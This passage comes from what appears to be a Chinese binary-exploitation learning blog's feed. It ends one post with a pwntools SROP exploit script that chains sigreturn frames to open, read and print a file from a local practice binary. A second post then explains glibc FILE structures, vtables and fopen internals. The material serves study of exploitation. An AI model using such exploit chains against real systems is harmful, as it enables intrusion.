class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/home/ubuntu/桌面/pwn/<span class=\"number\">8</span>月/srop/test1<span class=\"comment\"># cat exp.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">small = ELF(<span class=\"string\">&#x27;./test&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">&#x27;REMOTE&#x27;</span>]:</span><br><span class=\"line\">    sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">7777</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    sh = process(<span class=\"string\">&#x27;./myprogram&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b 0x401000&quot;)</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">syscall_ret = <span class=\"number\">0x000000000040112e</span></span><br><span class=\"line\">start_addr = <span class=\"number\">0x0000000000401120</span></span><br><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(<span class=\"string\">&quot;\\x23&quot;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">16</span>:<span class=\"number\">24</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span> </span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;x&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_open</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0x402004</span> </span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;x&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">3</span> </span><br><span class=\"line\">sigframe.rsi = stack_addr+<span class=\"number\">0x200</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x100</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;x&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_write</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">1</span> </span><br><span class=\"line\">sigframe.rsi = stack_addr+<span class=\"number\">0x200</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x100</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;x&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>白名单感觉复杂点，可以直接上黑名单</p>\n<p><a href=\"https://www.sec4.fun/2018/07/23/seccomp/\">https://www.sec4.fun/2018/07/23/seccomp/</a></p>\n<p>​\t\t</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/",
            "title": "pwn入门-37-IOFILE初探",
            "date_published": "2023-08-07T05:35:58.000Z",
            "content_html": "<p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p>\n<p>啥时chain域?  如何在gdb中调试打印呢?</p>\n<p>我们可以在 libc.so 中找到 stdin\\stdout\\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p>\n<p>readelf怎么找符号来?</p>\n<p>readelf -s &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 | grep write@</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_2_1_stderr_</span><br><span class=\"line\">_IO_2_1_stdout_</span><br><span class=\"line\">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn<span class=\"meta\"># readelf -s /lib/x86_64-linux-gnu/libc.so.6   |grep stdin</span></span><br><span class=\"line\">   <span class=\"number\">378</span>: <span class=\"number\">00000000001</span>ec980   <span class=\"number\">224</span> OBJECT  GLOBAL DEFAULT   <span class=\"number\">34</span> _IO_2_1_stdin_@@GLIBC_2<span class=\"number\">.2</span><span class=\"number\">.5</span></span><br><span class=\"line\">   <span class=\"number\">547</span>: <span class=\"number\">00000000001</span>ed790     <span class=\"number\">8</span> OBJECT  GLOBAL DEFAULT   <span class=\"number\">34</span> <span class=\"built_in\">stdin</span>@@GLIBC_2<span class=\"number\">.2</span><span class=\"number\">.5</span></span><br><span class=\"line\">pwn<span class=\"meta\"># readelf -s /lib/x86_64-linux-gnu/libc.so.6   |grep _IO_2_1_st</span></span><br><span class=\"line\">   <span class=\"number\">378</span>: <span class=\"number\">00000000001</span>ec980   <span class=\"number\">224</span> OBJECT  GLOBAL DEFAULT   <span class=\"number\">34</span> _IO_2_1_stdin_@@GLIBC_2<span class=\"number\">.2</span><span class=\"number\">.5</span></span><br><span class=\"line\">   <span class=\"number\">852</span>: <span class=\"number\">00000000001</span>ed6a0   <span class=\"number\">224</span> OBJECT  GLOBAL DEFAULT   <span class=\"number\">34</span> _IO_2_1_stdout_@@GLIBC_2<span class=\"number\">.2</span><span class=\"number\">.5</span></span><br><span class=\"line\">  <span class=\"number\">1427</span>: <span class=\"number\">00000000001</span>ed5c0   <span class=\"number\">224</span> OBJECT  GLOBAL DEFAULT   <span class=\"number\">34</span> _IO_2_1_stderr_@@GLIBC_2<span class=\"number\">.2</span><span class=\"number\">.5</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"FILE-结构\"><a href=\"#FILE-结构\" class=\"headerlink\" title=\"FILE 结构\"></a>FILE 结构</h1><p><a href=\"https://blog.csdn.net/xy_369/article/details/130874848\">https://blog.csdn.net/xy_369/article/details/130874848</a></p>\n<p>​\t\t关于代码, 代码存在于glibc&#x2F;libio&#x2F;中 主要是libio.h</p>\n<p>​\t\tFILE结构被一系列流操作函数(fopen() fread() fclose())等所使用,大多数的FILE结构保存在堆上(stdin、stdout、stderr除外,位于libc数据段),其指针动态创建并由fopen函数返回</p>\n<p>​\t\t</p>\n<h2 id=\"IO-FILE-plus\"><a href=\"#IO-FILE-plus\" class=\"headerlink\" title=\"_IO_FILE_plus\"></a>_IO_FILE_plus</h2><p>​\t\t在libc2.23版本中,这个结构体是_IO_FILE_plus, 包含了一个 _IO_FILE结构体和一个指向 _IO_jump_t结构体的指针vtable</p>\n<p>libioP.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class=\"line\"><span class=\"comment\">   This contains a pointer to the function jump table used.</span></span><br><span class=\"line\"><span class=\"comment\">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class=\"line\"><span class=\"comment\">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  _IO_FILE file;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> *<span class=\"title\">vtable</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t各种文件结构(   _IO_FILE )采用单链表的形式连接起来( _chain域),通过 _IO_list_all访问</p>\n<p>​\t\tvtable为函数指针结构体,存放着各种IO相关函数的指针</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230807102222274.png\" alt=\"image-20230807102222274\"></p>\n<p>​\t</p>\n<p>像_IO_FILE_plus这种这么打印呢</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p &amp;_IO_list_all</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus **) <span class=\"number\">0x7ffff7fb05a0</span> &lt;_IO_list_all&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">pwndbg&gt;  p /x *(<span class=\"keyword\">struct</span> _IO_FILE_plus*) _IO_list_all</span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">0xfbad2086</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _chain = <span class=\"number\">0x7ffff7fb06a0</span>,</span><br><span class=\"line\">    _fileno = <span class=\"number\">0x2</span>,</span><br><span class=\"line\">    _flags2 = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _old_offset = <span class=\"number\">0xffffffffffffffff</span>,</span><br><span class=\"line\">    _cur_column = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _shortbuf = &#123;<span class=\"number\">0x0</span>&#125;,</span><br><span class=\"line\">    _lock = <span class=\"number\">0x7ffff7fb17d0</span>,</span><br><span class=\"line\">    _offset = <span class=\"number\">0xffffffffffffffff</span>,</span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7ffff7faf780</span>,</span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    __pad5 = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _mode = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _unused2 = &#123;<span class=\"number\">0x0</span> &lt;repeats <span class=\"number\">20</span> times&gt;&#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = <span class=\"number\">0x7ffff7fac4a0</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p /x *(<span class=\"keyword\">struct</span> _IO_jump_t*) _IO_list_all.vtable</span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">  __finish = <span class=\"number\">0x7ffff7e52f50</span>,</span><br><span class=\"line\">  __overflow = <span class=\"number\">0x7ffff7e53d80</span>,</span><br><span class=\"line\">  __underflow = <span class=\"number\">0x7ffff7e53a20</span>,</span><br><span class=\"line\">  __uflow = <span class=\"number\">0x7ffff7e54f50</span>,</span><br><span class=\"line\">  __pbackfail = <span class=\"number\">0x7ffff7e56680</span>,</span><br><span class=\"line\">  __xsputn = <span class=\"number\">0x7ffff7e525d0</span>,</span><br><span class=\"line\">  __xsgetn = <span class=\"number\">0x7ffff7e52240</span>,</span><br><span class=\"line\">  __seekoff = <span class=\"number\">0x7ffff7e51860</span>,</span><br><span class=\"line\">  __seekpos = <span class=\"number\">0x7ffff7e55600</span>,</span><br><span class=\"line\">  __setbuf = <span class=\"number\">0x7ffff7e51530</span>,</span><br><span class=\"line\">  __sync = <span class=\"number\">0x7ffff7e513c0</span>,</span><br><span class=\"line\">  __doallocate = <span class=\"number\">0x7ffff7e44c70</span>,</span><br><span class=\"line\">  __read = <span class=\"number\">0x7ffff7e525a0</span>,</span><br><span class=\"line\">  __write = <span class=\"number\">0x7ffff7e51e60</span>,</span><br><span class=\"line\">  __seek = <span class=\"number\">0x7ffff7e51600</span>,</span><br><span class=\"line\">  __close = <span class=\"number\">0x7ffff7e51520</span>,</span><br><span class=\"line\">  __stat = <span class=\"number\">0x7ffff7e51e40</span>,</span><br><span class=\"line\">  __showmanyc = <span class=\"number\">0x7ffff7e56810</span>,</span><br><span class=\"line\">  __imbue = <span class=\"number\">0x7ffff7e56820</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">      </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"初始情况\"><a href=\"#初始情况\" class=\"headerlink\" title=\"初始情况\"></a>初始情况</h2><p>​\t\t初始情况下_IO_FILE 结构有<code>_IO_2_1_stderr_</code> ，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stdin_</code> 三个,通过 <code>_IO_list_all</code>连接起来</p>\n<p>stdfiles.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class=\"line\"><span class=\"meta\">#  <span class=\"keyword\">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \\</span></span><br><span class=\"line\"><span class=\"meta\">  static struct _IO_wide_data _IO_wide_data_##FD \\</span></span><br><span class=\"line\"><span class=\"meta\">    = &#123; ._wide_vtable = &amp;_IO_wfile_jumps &#125;; \\</span></span><br><span class=\"line\"><span class=\"meta\">  struct _IO_FILE_plus NAME \\</span></span><br><span class=\"line\"><span class=\"meta\">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \\</span></span><br><span class=\"line\"><span class=\"meta\">       &amp;_IO_file_jumps&#125;;</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\">#  <span class=\"keyword\">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \\</span></span><br><span class=\"line\"><span class=\"meta\">  struct _IO_FILE_plus NAME \\</span></span><br><span class=\"line\"><span class=\"meta\">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, NULL), \\</span></span><br><span class=\"line\"><span class=\"meta\">       &amp;_IO_file_jumps&#125;;</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">DEF_STDFILE(_IO_2_1_stdin_, <span class=\"number\">0</span>, <span class=\"number\">0</span>, _IO_NO_WRITES);</span><br><span class=\"line\">DEF_STDFILE(_IO_2_1_stdout_, <span class=\"number\">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class=\"line\">DEF_STDFILE(_IO_2_1_stderr_, <span class=\"number\">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span> *_<span class=\"title\">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br><span class=\"line\">libc_hidden_data_def (_IO_list_all)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t并且存在 3 个全局指针 <code>stdin</code>，<code>stdout</code>，<code>stderr</code> 分别指向 <code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code> 三个结构体。</p>\n<p>stdio.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> stdin</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> stdout</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> stderr</span></span><br><span class=\"line\">_IO_FILE *<span class=\"built_in\">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class=\"line\">_IO_FILE *<span class=\"built_in\">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class=\"line\">_IO_FILE *<span class=\"built_in\">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> _IO_stdin</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> _IO_stdout</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> _IO_stderr</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t于是初始化后的结构如下,可以看到是头插法插入新来的iofile</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/b71716ff58f043fbec0605f33b934102.png\" alt=\"b71716ff58f043fbec0605f33b934102\"></p>\n<h2 id=\"fopen\"><a href=\"#fopen\" class=\"headerlink\" title=\"fopen\"></a>fopen</h2><p>​\t\tfopen在标准IO库中用于打开文件,函数原型如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FILE *<span class=\"title function_\">fopen</span><span class=\"params\">(<span class=\"type\">char</span> *filename, *type)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>源码分析如下</p>\n<p>include&#x2F;stdio.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#  <span class=\"keyword\">if</span> IS_IN (libc)</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> _IO_FILE *_IO_new_fopen (<span class=\"type\">const</span> <span class=\"type\">char</span>*, <span class=\"type\">const</span> <span class=\"type\">char</span>*);</span><br><span class=\"line\"><span class=\"meta\">#   <span class=\"keyword\">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span></span><br></pre></td></tr></table></figure>\n\n<p>libio&#x2F;iofopen.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_FILE *</span><br><span class=\"line\">_IO_new_fopen (<span class=\"type\">const</span> <span class=\"type\">char</span> *filename, <span class=\"type\">const</span> <span class=\"type\">char</span> *mode)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __fopen_internal (filename, mode, <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t具体代码分析</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_FILE *</span><br><span class=\"line\">__fopen_internal (<span class=\"type\">const</span> <span class=\"type\">char</span> *filename, <span class=\"type\">const</span> <span class=\"type\">char</span> *mode, <span class=\"type\">int</span> is32)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">locked_FILE</span></span></span><br><span class=\"line\"><span class=\"class\">  &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span> <span class=\"title\">fp</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class=\"line\">    _IO_lock_t lock;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_wide_data</span> <span class=\"title\">wd</span>;</span></span><br><span class=\"line\">  &#125; *new_f = 